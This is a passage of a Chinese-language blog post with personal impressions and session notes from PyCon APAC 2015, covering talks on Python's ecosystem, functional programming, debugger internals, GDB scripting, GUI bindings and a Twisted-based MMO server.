&lt;p&gt;順帶一提，PyCharm 攤位送的贈品是溜溜球，讓人有種回味童年的感覺  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;PyCon 真的每年都有不一樣的東西，&lt;br /&gt;
除了上面提到的 Night Party 跟 Bingo 以外，&lt;br /&gt;
其實會場的佈置也很棒，&lt;br /&gt;
現場有一個超級長的橫向時間軸海報，&lt;br /&gt;
上面記錄了跟 Python 相關的許多重大事件，&lt;br /&gt;
然後附上便利貼和筆，讓會眾可以在海報上面留言，&lt;br /&gt;
我只有拍下 PyCon 2015 的部分。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="poster" src="/files/pycon-apac-2015-notes-and-thoughts/poster.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後還有今年的穿梭時空的飛車的看板，&lt;br /&gt;
可以給人拍照用XD  &lt;/p&gt;
&lt;p&gt;&lt;img alt="signboard" src="/files/pycon-apac-2015-notes-and-thoughts/signboard.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;還有餐點也真的很棒  &lt;/p&gt;
&lt;p&gt;&lt;img alt="meal" src="/files/pycon-apac-2015-notes-and-thoughts/meal.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;因為工作人員幾乎都是上班族，&lt;br /&gt;
所以都是用下班或是假日的時間義務幫忙，&lt;br /&gt;
真的很感謝他們辛苦的籌備！  &lt;/p&gt;
&lt;p&gt;喔 對了 因為今年 irc channel 真的是有夠冷清&lt;br /&gt;
所以官方開了個 gitter 代替 irc 的聊天功能&lt;br /&gt;
想看聊天記錄的人可以去看看&lt;br /&gt;
&lt;a href="https://gitter.im/pycontw/pyconapac2015"&gt;https://gitter.im/pycontw/pyconapac2015&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;心得就是上面的部分啦&lt;br /&gt;
以下是三天議程中我自己紀錄的筆記，附上 Hackpad 共筆連結：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Date: 2015/06/05 - 2015/06/07&lt;br /&gt;
&lt;a href="https://hackpad.com/Slides-of-PyCon-APAC-2015-xyLGxKpDgwP"&gt;Slides of PyCon APAC 2015 - hackpad.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day 1 - 2015/06/05 - Fri&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-1-June-5-Tt8wwkILDX0"&gt;PyCon APAC 2015 - Day 1 (June 5) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Ecosystem Threats to Python - Van Lindberg&lt;/h4&gt;
&lt;p&gt;Python is 25 years old.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Python Ecosystem  &lt;ul&gt;
&lt;li&gt;2014 - Ranking of the programing language, took from stackoverflow, github  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Perl vs Python - from 2004 - 2013  &lt;ul&gt;
&lt;li&gt;Perl down, Python up.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The transistion from Python2 to Python3  &lt;/li&gt;
&lt;li&gt;Threats  &lt;ul&gt;
&lt;li&gt;Java  &lt;/li&gt;
&lt;li&gt;nodejs  &lt;/li&gt;
&lt;li&gt;go  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;I cannot interoperate  &lt;ul&gt;
&lt;li&gt;I see dead code.  &lt;/li&gt;
&lt;li&gt;Fortran, C, Cpp  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Django sucks in DjangoCon  &lt;/li&gt;
&lt;li&gt;Let's talk about Java, Why Java?  &lt;ul&gt;
&lt;li&gt;The corporate machine  &lt;/li&gt;
&lt;li&gt;The JVM  &lt;/li&gt;
&lt;li&gt;The Apache Software Foundation  &lt;/li&gt;
&lt;li&gt;Android  &lt;/li&gt;
&lt;li&gt;Big Data  &lt;/li&gt;
&lt;li&gt;..., Acceptable hackerness  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Javasciprt?  &lt;ul&gt;
&lt;li&gt;Ubiquity  &lt;/li&gt;
&lt;li&gt;Gmail  &lt;/li&gt;
&lt;li&gt;Chrome and Virtual Machine race  &lt;ul&gt;
&lt;li&gt;V8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Javascript, the Good Parts  &lt;/li&gt;
&lt;li&gt;Evented / Async from the ground up  &lt;/li&gt;
&lt;li&gt;JSON  &lt;/li&gt;
&lt;li&gt;..., Acceptable hackerness  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go  &lt;ul&gt;
&lt;li&gt;static binary  &lt;/li&gt;
&lt;li&gt;bottom up for multi-core use  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Go?  &lt;ul&gt;
&lt;li&gt;Rob Pike and Google  &lt;/li&gt;
&lt;li&gt;Pragmatic, small, "fits your brain"  &lt;/li&gt;
&lt;li&gt;Channels and Goroutines  &lt;ul&gt;
&lt;li&gt;centrate all CPUs  &lt;/li&gt;
&lt;li&gt;right now in Python we don't have this feature.  &lt;ul&gt;
&lt;li&gt;Pypy  &lt;/li&gt;
&lt;li&gt;libsvm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Performance  &lt;ul&gt;
&lt;li&gt;Python was created for simple using, but go focus on multi-core and performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;High level datatypes  &lt;/li&gt;
&lt;li&gt;gofmt  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://golang.org/cmd/gofmt/"&gt;https://golang.org/cmd/gofmt/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;go run  &lt;/li&gt;
&lt;li&gt;Deployment  &lt;/li&gt;
&lt;li&gt;Speed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python  &lt;ul&gt;
&lt;li&gt;Let's talk about what we are doing wrong  &lt;/li&gt;
&lt;li&gt;Multi-core, package managemnet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Python?  &lt;ul&gt;
&lt;li&gt;Broad Ecosystem  &lt;ul&gt;
&lt;li&gt;ruby - bind with rails  &lt;/li&gt;
&lt;li&gt;go - small group of UNIX servers  &lt;/li&gt;
&lt;li&gt;python - it's hard to say where python it is, it's everywhere.  &lt;ul&gt;
&lt;li&gt;Every Movie, single media stream today, used Python.  &lt;/li&gt;
&lt;li&gt;Huge strike in the scientific computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pragmatic, "fits your brain"  &lt;/li&gt;
&lt;li&gt;Teaching language  &lt;/li&gt;
&lt;li&gt;The PyPy R&amp;amp;D division  &lt;/li&gt;
&lt;li&gt;Python 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python is not just a language, Python is the Python Community.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;When programming functionally in Python - Apua Juan&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Theory in Functional Programming  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.cs.kent.ac.uk/people/staff/dat/miranda/whyfp90.pdf"&gt;Why Functional Programming Matters&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generator Failure?  &lt;ul&gt;
&lt;li&gt;Range object vs Generator  &lt;/li&gt;
&lt;li&gt;這兩個是不一樣的東西，generator 就是跑過就沒了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Coroutine  &lt;ul&gt;
&lt;li&gt;Example in Python Official Document  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List comprehension from Haskell  &lt;ul&gt;
&lt;li&gt;lambda function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python doesn't provide...  &lt;ul&gt;
&lt;li&gt;Algebraic Data Type? Recursive Data Type? Parametric or generic  &lt;ul&gt;
&lt;li&gt;Class 無助於產生 ADT  &lt;/li&gt;
&lt;li&gt;meta-class 可以，但不完全，還是得定義給了什麼 Class  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pattern Matching  &lt;ul&gt;
&lt;li&gt;_, a = abc(*data)  &lt;/li&gt;
&lt;li&gt;這方面的支援不夠好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type Class  &lt;ul&gt;
&lt;li&gt;Type Class is NOT "Class"  &lt;/li&gt;
&lt;li&gt;Another form of data abstraction  &lt;/li&gt;
&lt;li&gt;More abstract than ADT  &lt;/li&gt;
&lt;li&gt;It is the abc (Abstract Base Class) in Python  &lt;ul&gt;
&lt;li&gt;Django 大量的使用了 abc  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Monad  &lt;ul&gt;
&lt;li&gt;keyword "Maybe" in Haskell  &lt;/li&gt;
&lt;li&gt;Container, Function for Container  &lt;/li&gt;
&lt;li&gt;Monadic  &lt;ul&gt;
&lt;li&gt;開了個檔案，但是使用 read mode, 並對該 fd 做寫入, 不應該改動  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type System  &lt;ul&gt;
&lt;li&gt;Python use Duck Typing, so we basically don't use specific type.  &lt;/li&gt;
&lt;li&gt;Annotation for type checking in the future Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generic Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fcn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="o"&gt;---&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fcn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Python lacks somthing in Functional Programming  &lt;ul&gt;
&lt;li&gt;imperative vs declarative  &lt;/li&gt;
&lt;li&gt;interpreted vs compiled  &lt;/li&gt;
&lt;li&gt;dynamic typed vs static typed  &lt;/li&gt;
&lt;li&gt;Python 基本上偏左邊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python Debugger Uncovered - Dmitry Trofimov&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;about this talk  &lt;ul&gt;
&lt;li&gt;how to trace Python programs  &lt;/li&gt;
&lt;li&gt;show implementation of a Python Debugger  &lt;/li&gt;
&lt;li&gt;lots of code  &lt;/li&gt;
&lt;li&gt;PyDev  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python debuggers  &lt;ul&gt;
&lt;li&gt;Implemented in Python  &lt;ul&gt;
&lt;li&gt;pdb, PyCharm, Pydev  &lt;/li&gt;
&lt;li&gt;platform independent: CPython, Jython, PyPy, IronPython  &lt;/li&gt;
&lt;li&gt;Can be broken by user code (can be prevented by tricky fixes)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Implemented in C  &lt;ul&gt;
&lt;li&gt;winpdb, Wing, gdb(with Python mappings)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tracing Python code with Python  &lt;ul&gt;
&lt;li&gt;sys.settrace(tracefunc)  &lt;ul&gt;
&lt;li&gt;call, line, reutrn, c_call, c_return, c_exception  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simple Trace Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;tracefunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; on #&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt; % (event, frame.f_lineno))  &lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;tracefunc&lt;/span&gt;  

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;  

&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tracefunc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Let's make simple Python debugger  &lt;ul&gt;
&lt;li&gt;Console Debugger  &lt;/li&gt;
&lt;li&gt;Visual Debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protocol  &lt;ul&gt;
&lt;li&gt;every message is a line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Command Types  &lt;ul&gt;
&lt;li&gt;Set Breakpoint  &lt;/li&gt;
&lt;li&gt;Resume  &lt;/li&gt;
&lt;li&gt;Get Threads  &lt;/li&gt;
&lt;li&gt;Get Frame  &lt;/li&gt;
&lt;li&gt;Evaluate Expression  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDE  &lt;ul&gt;
&lt;li&gt;Creates server socket  &lt;/li&gt;
&lt;li&gt;Launches a script being debugged with a command  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debugger Main Code  &lt;/li&gt;
&lt;li&gt;Demo  &lt;/li&gt;
&lt;li&gt;Important Features  &lt;ul&gt;
&lt;li&gt;Conditional Breakpoints  &lt;/li&gt;
&lt;li&gt;Exception Breakpoint  &lt;/li&gt;
&lt;li&gt;Step Over / Step Into / Run to Line  &lt;/li&gt;
&lt;li&gt;PYthon 2.4 to Python 3.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.python.org/moin/PythonDebuggers"&gt;https://wiki.python.org/moin/PythonDebuggers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Programmatic Debugging with GDB and Python - Scott Tsai&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;debug C / C++ code with Python  &lt;/li&gt;
&lt;li&gt;GDB  &lt;ul&gt;
&lt;li&gt;set a Conditional Breakpoint  &lt;/li&gt;
&lt;li&gt;set a Breakpoint that only triggers for a specific thread  &lt;/li&gt;
&lt;li&gt;Debug multiple process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Getting a Python Prompt in GDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; python-interactive  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;GDB Embedding IPython  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(In some .py file)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;IPython&lt;/span&gt;  
&lt;span class="n"&gt;IPython&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;embed_kernel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(In some shell)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb -x gdb-ipython.py  
$ ipython3 console kernel-xxx.json  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb -q /bin/true  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; start  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; python-interactive  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;How Source Level Debugging works?  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcc -g&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;eu-strip -f xxx.debug xxx&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;eu-strip - split debug info  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Do my binaries have debug info?  &lt;ul&gt;
&lt;li&gt;Look for the .debug_info section  &lt;/li&gt;
&lt;li&gt;.gnu_debuglink  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DWARF ELF Sections  &lt;ul&gt;
&lt;li&gt;.debug_abbrev  &lt;/li&gt;
&lt;li&gt;.debug_info  &lt;/li&gt;
&lt;li&gt;pyelftools  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pip install pyelftools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux Distros Provide Debug Info  &lt;ul&gt;
&lt;li&gt;(Fedora, Red Hat)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;debug-info install $PACKGENAME&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython and Numpy has debug info, butt libz.so and other externel libraries don't.  &lt;/li&gt;
&lt;li&gt;Debug multiprocess with gdb  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;set detach-on-fork off  
set traget-async on  
set pagination off  
add-inferior  
...  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Debug Optimized Code  &lt;ul&gt;
&lt;li&gt;use gdb to alter the control flow  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;The Future of GUI Programming with Python - Tzu-ping Chung&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Tkinter  &lt;ul&gt;
&lt;li&gt;Python's de-facto standard GUI  &lt;/li&gt;
&lt;li&gt;Native nowhere  &lt;ul&gt;
&lt;li&gt;Themed Tk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binding to Tcl/Tk  &lt;/li&gt;
&lt;li&gt;Lean, but may be lacking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Platform-specific  &lt;ul&gt;
&lt;li&gt;PyObjC on OS X (Cocoa)  &lt;/li&gt;
&lt;li&gt;WIn32API on Windows  &lt;/li&gt;
&lt;li&gt;PyGObject on Gnome (GTK+)  &lt;/li&gt;
&lt;li&gt;Native UI/UX  &lt;/li&gt;
&lt;li&gt;Needs to deploy C Binding  &lt;/li&gt;
&lt;li&gt;Very weird API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binding  &lt;/li&gt;
&lt;li&gt;Let's Build Everything  &lt;ul&gt;
&lt;li&gt;Kivy and Pyglet  &lt;/li&gt;
&lt;li&gt;Cross-platform application code  &lt;/li&gt;
&lt;li&gt;Nice Pythonic API  &lt;/li&gt;
&lt;li&gt;Needs to deploy C binding  &lt;/li&gt;
&lt;li&gt;Not Native (and they don't care)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Licensing  &lt;ul&gt;
&lt;li&gt;GPL and LGPL  &lt;/li&gt;
&lt;li&gt;Source distribution  &lt;/li&gt;
&lt;li&gt;Static linking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What I want  &lt;ul&gt;
&lt;li&gt;Native UI and UX  &lt;/li&gt;
&lt;li&gt;Portability  &lt;/li&gt;
&lt;li&gt;Ease to Deploy  &lt;/li&gt;
&lt;li&gt;Pythonic API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Solution (IMO)  &lt;ul&gt;
&lt;li&gt;Dynamic binding to native GUI  &lt;/li&gt;
&lt;li&gt;CPython compatibility  &lt;/li&gt;
&lt;li&gt;No non-Python dependencies  &lt;/li&gt;
&lt;li&gt;Wrapper on top  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Binding  &lt;ul&gt;
&lt;li&gt;Foreign function interface (FFI)  &lt;/li&gt;
&lt;li&gt;libffi  &lt;/li&gt;
&lt;li&gt;ctypes  &lt;/li&gt;
&lt;li&gt;CFFI, anyone?  &lt;/li&gt;
&lt;li&gt;related links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cffi.readthedocs.org/en/latest/"&gt;https://cffi.readthedocs.org/en/latest/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/ctypes.html"&gt;https://docs.python.org/2/library/ctypes.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://eli.thegreenplace.net/2013/03/09/python-ffi-with-ctypes-and-cffi"&gt;http://eli.thegreenplace.net/2013/03/09/python-ffi-with-ctypes-and-cffi&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Foreign_function_interface"&gt;http://en.wikipedia.org/wiki/Foreign_function_interface&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sourceware.org/libffi/"&gt;https://sourceware.org/libffi/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model  &lt;ul&gt;
&lt;li&gt;Ideal: Python API wrapper &amp;lt;=&amp;gt; Binding (in Python) &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;Windows: Python API Wrapper &amp;lt;=&amp;gt; ctypes &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;Ubuntu: Python API Wrapper &amp;lt;=&amp;gt; ctypes &amp;lt;=&amp;gt; Native API  &lt;/li&gt;
&lt;li&gt;OS X: Python API Wrapper &amp;lt;=&amp;gt; { ctypes / ctypes + wrapper &amp;lt;=&amp;gt; objectvie-c API}&amp;lt;=&amp;gt; C API (e.g. CoreFoundation)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pybee/toga"&gt;toga&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://pybee.org/toga/"&gt;http://pybee.org/toga/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install toga-demo  
$ toga-demo  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Difficulties  &lt;ul&gt;
&lt;li&gt;API Design  &lt;/li&gt;
&lt;li&gt;Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Problem  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;Different Paradigms  &lt;/li&gt;
&lt;li&gt;"The Store"  &lt;/li&gt;
&lt;li&gt;Android, iOS, Windows Phone  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://lwn.net/Articles/640625"&gt;http://lwn.net/Articles/640625&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Support  &lt;ul&gt;
&lt;li&gt;C API Availability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Activity Stack / Fragment  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;RPyScan&lt;/h4&gt;
&lt;p&gt;用 Raspberry Pi + Python 自幹 3D 人體掃描機，因為買現成的太貴了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;MMO Server Design with Twisted.py - Dan Maas&lt;/h4&gt;
&lt;p&gt;// 這外國講者的中文講的真的蠻標準的  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SPINPUNCH  &lt;/li&gt;
&lt;li&gt;THUNDER RUN  &lt;/li&gt;
&lt;li&gt;Topics  &lt;ul&gt;
&lt;li&gt;System Architecture  &lt;/li&gt;
&lt;li&gt;How to write asynchronous HTTP server with Twisted  &lt;/li&gt;
&lt;li&gt;How to profile Asynchronous Server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Game = Engine + Game Data + Art  &lt;ul&gt;
&lt;li&gt;Engine: Server, Client, Analytics  &lt;/li&gt;
&lt;li&gt;Game Data: Units, buildings, items  &lt;/li&gt;
&lt;li&gt;Art: Images, Sounds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Engine  &lt;ul&gt;
&lt;li&gt;Client / Server "web app"  &lt;/li&gt;
&lt;li&gt;Server: Python  &lt;/li&gt;
&lt;li&gt;Client: JavaScript / HTML5 Canvas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Won't be mention today  &lt;ul&gt;
&lt;li&gt;Analytics system (SQL, map/reduce)  &lt;/li&gt;
&lt;li&gt;Gamedata build pipeline  &lt;/li&gt;
&lt;li&gt;Art build pipeline  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server  &lt;ul&gt;
&lt;li&gt;Client sends requests (by HTTP) to run gmae actions  &lt;ul&gt;
&lt;li&gt;"Upgrade this building"  &lt;/li&gt;
&lt;li&gt;"Produce this unit"  &lt;/li&gt;
&lt;li&gt;"Buy this thing in the Store"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check requirements, if OK, then mutate player state, send reply  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server Design Requirements  &lt;ul&gt;
&lt;li&gt;High Scale  &lt;ul&gt;
&lt;li&gt;20,000+ daily players  &lt;/li&gt;
&lt;li&gt;2,000+ concurrent players  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Low latency  &lt;ul&gt;
&lt;li&gt;cannot greater than 1xx ms  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server Implementation  &lt;ul&gt;
&lt;li&gt;Python  &lt;/li&gt;
&lt;li&gt;Twisted Asynchronous HTTP server  &lt;/li&gt;
&lt;li&gt;Cluster of processes (on Amazon EC2)  &lt;/li&gt;
